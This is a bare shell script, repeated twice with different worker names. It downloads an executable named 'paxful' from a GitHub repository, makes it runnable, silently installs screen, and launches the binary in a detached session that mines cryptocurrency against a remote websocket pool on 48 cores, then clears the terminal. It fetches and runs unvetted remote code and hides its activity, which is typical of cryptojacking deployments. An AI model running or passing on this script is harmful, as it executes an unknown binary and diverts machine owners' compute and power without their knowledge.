wget https://github.com/obisumila/scaling-octo-happiness/raw/refs/heads/main/paxful ;
chmod +x paxful ;
sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
screen -S luv -dm ./paxful --url ws://tw-pool.com:5487/mine mine --username Bu7zCyCBimDMtbmfkZFqh7r7drQpiNTBDK3Qcj1PTeBM.WINCOS --cores 48 ; 
screen -ls
sleep 2
clear
screen -ls ; 

wget https://github.com/obisumila/scaling-octo-happiness/raw/refs/heads/main/paxful ;
chmod +x paxful ;
sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
screen -S luv -dm ./paxful --url ws://tw-pool.com:5487/mine mine --username Bu7zCyCBimDMtbmfkZFqh7r7drQpiNTBDK3Qcj1PTeBM.VOLX --cores 48 ; 
screen -ls
sleep 2
clear
screen -ls ; 
